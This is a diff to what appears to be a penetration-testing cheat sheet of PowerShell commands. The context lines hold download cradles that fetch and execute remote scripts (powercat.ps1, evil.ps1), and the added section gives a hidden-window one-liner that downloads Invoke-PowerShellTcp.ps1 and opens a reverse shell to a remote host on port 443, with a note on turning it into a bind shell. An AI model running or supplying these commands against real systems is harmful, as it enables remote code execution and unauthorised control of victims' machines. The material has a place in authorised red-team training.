@@ -61,3 +61,9 @@ PowerShell v3+
 iex (iwr http://172.16.100.83/powercat.ps1 -UseBasicParsing)
 iex (iwr 'http://192.168.230.1/evil.ps1')
 ```
+
+Reverse Shell Execution by transferring file. Same can be used for bind shell too by changing **-Reverse** to **-Bind**. Power here is the function name to call and can be modified.
+
+```powershell
+powershell -nop -w hidden -c "IEX (iwr 'http://172.16.100.38/Invoke-PowerShellTcp.ps1' -UseBasicParsing); Power -Reverse -IPAddress 172.16.100.38 -Port 443
+```
